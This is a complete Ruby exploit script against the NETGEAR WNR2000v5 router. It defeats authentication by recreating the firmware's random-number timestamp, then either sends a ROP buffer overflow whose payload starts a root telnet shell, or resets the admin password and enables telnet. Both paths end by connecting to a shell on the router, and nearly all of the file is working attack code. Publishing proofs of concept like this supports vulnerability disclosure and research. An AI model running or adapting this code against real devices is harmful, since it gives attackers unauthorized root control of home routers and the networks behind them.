#
# Remote code execution in NETGEAR WNR2000v5
# - by Pedro Ribeiro (pedrib@gmail.com) / Agile Information Security
# Released on 20/12/2016
#
# NOTE: this exploit is "alpha" quality and has been deprecated. Please see the modules
# accepted into the Metasploit framework, or https://github.com/pedrib/PoC/tree/master/exploits/metasploit/wnr2000
#
#
# TODO:
# - randomise payload

require 'net/http'
require 'uri'
require 'time'
require 'digest'
require 'openssl'
require 'socket'

####################
# ported from https://git.uclibc.org/uClibc/tree/libc/stdlib/random.c
# and https://git.uclibc.org/uClibc/tree/libc/stdlib/random_r.c

TYPE_3 = 3
BREAK_3 = 128
DEG_3 = 31
SEP_3 = 3

@randtbl =
[
  # we omit TYPE_3 from here, not needed
  -1726662223, 379960547, 1735697613, 1040273694, 1313901226,
  1627687941, -179304937, -2073333483, 1780058412, -1989503057,
  -615974602, 344556628, 939512070, -1249116260, 1507946756,
  -812545463, 154635395, 1388815473, -1926676823, 525320961,
  -1009028674, 968117788, -123449607, 1284210865, 435012392,
  -2017506339, -911064859, -370259173, 1132637927, 1398500161,
  -205601318,
]

@unsafe_state = {
  "fptr" => SEP_3,
  "rptr" => 0,
  "state" => 0,
  "rand_type" => TYPE_3,
  "rand_deg" => DEG_3,
  "rand_sep" => SEP_3,
  "end_ptr" => DEG_3
}

# Emulate the behaviour of C's srand
def srandom_r (seed)
  state = @randtbl
  if seed == 0
    seed = 1
  end
  state[0] = seed

  dst = 0
  word = seed
  kc = DEG_3
  for i in 1..(kc-1)
    hi = word / 127773
    lo = word % 127773
    word = 16807 * lo - 2836 * hi
    if (word < 0)
      word += 2147483647
    end
    dst += 1
    state[dst] = word
  end

  @unsafe_state['fptr'] = @unsafe_state['rand_sep']
  @unsafe_state['rptr'] = 0

  kc *= 10
  kc -= 1
  while (kc >= 0)
    random_r
    kc -= 1
  end
end

# Emulate the behaviour of C's rand
def random_r
  buf = @unsafe_state
  state = buf['state']

  fptr = buf['fptr']
  rptr = buf['rptr']
  end_ptr = buf['end_ptr']
  val = @randtbl[fptr] += @randtbl[rptr]

  result = (val >> 1) & 0x7fffffff
  fptr += 1
  if (fptr >= end_ptr)
    fptr = state
    rptr += 1
  else
    rptr += 1
    if (rptr >= end_ptr)
      rptr = state
    end
  end
  buf['fptr'] = fptr
  buf['rptr'] = rptr

  result
end
#####################

#####################
# Ruby code ported from https://github.com/insanid/netgear-telenetenable
#
def telnetenable (username, password)
  mac_pad = @mac.gsub(':', '').upcase.ljust(0x10,"\x00")
  username_pad = username.ljust(0x10, "\x00")
  password_pad = password.ljust(0x21, "\x00")
  cleartext = (mac_pad + username_pad + password_pad).ljust(0x70, "\x00")

  md5 = Digest::MD5.new
  md5.update(cleartext)
  payload = (md5.digest + cleartext).ljust(0x80, "\x00").unpack('N*').pack('V*')

  secret_key = "AMBIT_TELNET_ENABLE+" + password
  cipher = OpenSSL::Cipher::Cipher.new("bf-ecb").send :encrypt
  cipher.key_len = secret_key.length
  cipher.key = secret_key
  cipher.padding = 0
  binary_data = (cipher.update(payload) << cipher.final)

  s = UDPSocket.new
  s.send(binary_data.unpack('N*').pack('V*'), 0, @target.split(':')[0], 23)
end
#####################

# Do some crazyness to force Ruby to cast to a single-precision float and
# back to an integer.
# This emulates the behaviour of the soft-fp library and the float cast
# which is done at the end of Netgear's timestamp generator.
def ieee754_round (number)
  [number].pack('f').unpack('f*')[0].to_i
end


# This is the actual algorithm used in the get_timestamp function in
# the Netgear firmware.
def get_timestamp(time)
  srandom_r time
  t0 = random_r
  t1 = 0x17dc65df;
  hi = (t0 * t1) >> 32;
  t2 = t0 >> 31;
  t3 = hi >> 23;
  t3 = t3 - t2;
  t4 = t3 * 0x55d4a80;
  t0 = t0 - t4;
  t0 = t0 + 0x989680;

  ieee754_round(t0)
end

# Default credentials for the router
USERNAME = "admin"
PASSWORD = "password"

def get_request(uri_str)
  uri = URI.parse(uri_str)
  http = Net::HTTP.new(uri.host, uri.port)
  #http.set_debug_output($stdout)
  request = Net::HTTP::Get.new(uri.request_uri)
  request.basic_auth(USERNAME, PASSWORD)
  http.request(request)
end

def post_request(uri_str, body)
  uri = URI.parse(uri_str)
  header = { 'Content-Type' => 'application/x-www-form-urlencoded' }
  http = Net::HTTP.new(uri.host, uri.port)
  #http.set_debug_output($stdout)
  request = Net::HTTP::Post.new(uri.request_uri, header)
  request.basic_auth(USERNAME, PASSWORD)
  request.body = body
  http.request(request)
end

def check
  response = get_request("http://#{@target}/")
  auth = response['WWW-Authenticate']
  if auth != nil
    if auth =~ /WNR2000v5/
      puts "[+] Router is vulnerable and exploitable (WNR2000v5)."
      return
    elsif auth =~ /WNR2000v4/ || auth =~ /WNR2000v3/
      puts "[-] Router is vulnerable, but this exploit might not work (WNR2000v3 or v4)."
      return
    end
  end
  puts "Router is not vulnerable."
end

def get_password
  response = get_request("http://#{@target}/BRS_netgear_success.html")
  if response.body =~ /var sn="([\w]*)";/
    serial = $1
  else
    puts "[-]Failed to obtain serial number, bailing out..."
    exit(1)
  end

  # 1: send serial number
  response = post_request("http://#{@target}/apply_noauth.cgi?/unauth.cgi", "submit_flag=match_sn&serial_num=#{serial}&continue=+Continue+")

  # 2: send answer to secret questions
  response = post_request("http://#{@target}/apply_noauth.cgi?/securityquestions.cgi", \
    "submit_flag=security_question&answer1=secretanswer1&answer2=secretanswer2&continue=+Continue+")

  # 3: PROFIT!!!
  response = get_request("http://#{@target}/passwordrecovered.cgi")

  if response.body =~ /Admin Password: (.*)<\/TD>/
    password = $1
  else
    puts "[-] Failed to obtain admin password, bailing out..."
    exit(1)
  end

  if response.body =~ /Admin Username: (.*)<\/TD>/
    username = $1
  else
    puts "[-] Failed to obtain admin username, bailing out..."
    exit(1)
  end

  puts "[+] Success! Got admin username #{username} and password #{password}"
  return [username, password]
end

def get_current_time
  response = get_request("http://#{@target}/")

  date = response['Date']
  Time.parse(date).strftime('%s').to_i
end

def get_auth_timestamp(mode)
  if mode == "bof"
    uri_str = "http://#{@target}/lang_check.html"
  else
    uri_str = "http://#{@target}/PWD_password.htm"
  end
  response = get_request(uri_str)
  if response.code == 401
    # try again, might fail the first time
    response = get_request(uri_str)
    if response.code == 200
      if response.body =~ /timestamp=([0-9]{8})/
        $1.to_i
      end
    end
  end
end

def got_shell
  puts "[+] Success, shell incoming!"
  exec("telnet #{@target.split(':')[0]}")
end

if ARGV.length < 2
  puts "Usage: ./netgearPwn.rb <IP:PORT> <check|bof|telnet <MAC>> [noreboot]"
  puts "\tcheck: see if the target is vulnerable"
  puts "\tbof: run buffer overflow exploit on the target"
  puts "\ttelnet <mac>: run telnet exploit on the target, needs MAC address"
  puts "\tnoreboot: optional parameter - don't force a reboot on the target"
  exit(1)
end

@target = ARGV[0]
mode = ARGV[1]

if (ARGV.length > 2 && ARGV[2] == "noreboot") || (ARGV.length > 3 && ARGV[3] == "noreboot")
  reboot = false
else
  reboot = true
end

if mode == "telnet"
  if ARGV.length == 3
    @mac = ARGV[2]
  elsif ARGV.length == 4
    @mac = ARGV[3]
  else
    puts "[-] telnet mode needs MAC address argument!"
    exit(-1)
  end
end

# Maximum time differential to try
# Look 5000 seconds back for the timestamp with reboot
# 500000 with no reboot
if reboot
  TIME_OFFSET = 5000
else
  TIME_OFFSET = 500000
end

# Increase this if you're sure the device is vulnerable and you're not getting a shell
TIME_SURPLUS = 200

if mode == "check"
  check
  exit(0)
end

if mode == "bof"
  def uri_encode (str)
    "%" + str.scan(/.{2}|.+/).join("%")
  end

  def calc_address (libc_base, offset)
    addr = (libc_base + offset).to_s(16)
    uri_encode(addr)
  end

  system_offset = 0x547D0
  gadget = 0x2462C
  libc_base = 0x2ab24000

  payload = 'a' * 36 +                                                                 # filler_1
    calc_address(libc_base, system_offset) +                                           # s0
    '1111' +                                                                           # s1
    '2222' +                                                                           # s2
    '3333' +                                                                           # s3
    calc_address(libc_base, gadget) +                                                  # gadget
    'b' * 0x40 +                                                                       # filler_2
    "killall telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l /bin/sh"         # payload
end

# 0: try to see if the default admin username and password are set
timestamp = get_auth_timestamp(mode)

# 1: reboot the router to get it to generate new timestamps
if reboot and timestamp == nil
  response = post_request("http://#{@target}/apply_noauth.cgi?/reboot_waiting.htm", "submit_flag=reboot&yes=Yes")
  if response.code == "200"
    puts "[+] Successfully rebooted the router. Now wait two minutes for the router to restart..."
    sleep 120
    puts "[*] Connect to the WLAN or Ethernet now. You have one minute to comply."
    sleep 60
  else
    puts "[-] Failed to reboot the router. Bailing out."
    exit(-1)
  end

  puts "[*] Proceeding..."
end

# 2: get the current date from the router and parse it, but only if we are not authenticated...
if timestamp == nil
  end_time = get_current_time
  if end_time <= TIME_OFFSET
    start_time = 0
  else
    start_time = end_time - TIME_OFFSET
  end
  end_time += TIME_SURPLUS

  if end_time < (TIME_SURPLUS * 7.5).to_i
    end_time = (TIME_SURPLUS * 7.5).to_i
  end

  puts "[+] Got time #{end_time} from router, starting exploitation attempt."
  puts "[*] Be patient, this might take up a long time (typically a few minutes, but maybe an hour or more)."
end

if mode == "bof"
  uri_str = "http://#{@target}/apply_noauth.cgi?/lang_check.html%20timestamp="
  body = "submit_flag=select_language&hidden_lang_avi=#{payload}"
else
  uri_str = "http://#{@target}/apply_noauth.cgi?/PWD_password.htm%20timestamp="
  body = "submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=secretanswer1&question2=2&answer2=secretanswer2"
end

# 3: work back from the current router time minus TIME_OFFSET
while true
  for time in end_time.downto(start_time)
    begin
      if timestamp == nil
        response = post_request(uri_str + get_timestamp(time).to_s, body)
      else
        response = post_request(uri_str + timestamp.to_s, body)
      end
      if response.code == "200"
        # this only occurs in the telnet case
        credentials = get_password
        telnetenable(credentials[0], credentials[1])
        sleep 5
        got_shell
        #puts "Done! Got admin username #{credentials[0]} and password #{credentials[1]}"
        #puts "Use the telnetenable.py script (https://github.com/insanid/netgear-telenetenable) to enable telnet, and connect to port 23 to get a root shell!"
        exit(0)
      end
    rescue EOFError
      if reboot
        sleep 0.2
      else
        # with no reboot we give the router more time to breathe
        sleep 0.5
      end
      begin
        s = TCPSocket.new(@target.split(':')[0], 23)
        s.close
        got_shell
      rescue Errno::ECONNREFUSED
        if timestamp != nil
          # this is the case where we can get an authenticated timestamp but we could not execute code
          # IT SHOULD NEVER HAPPEN
          # But scream and continue just in case, it means there is a bug
          puts "[-] Something went wrong. We can obtain the timestamp with the default credentials, but we could not execute code."
          puts "[*] Let's try again..."
          timestamp = get_auth_timestamp
        end
        next
      end
    rescue Net::ReadTimeout
      # for bof case, we land here
      got_shell
    end
  end
  if timestamp == nil
    start_time = end_time - (TIME_SURPLUS * 5)
    end_time = end_time + (TIME_SURPLUS * 5)
    puts "[*] Going for another round, increasing end time to #{end_time} and start time to #{start_time}"
  end
end

# If we get here then the exploit failed
puts "[-] Exploit finished. Failed to get a shell!"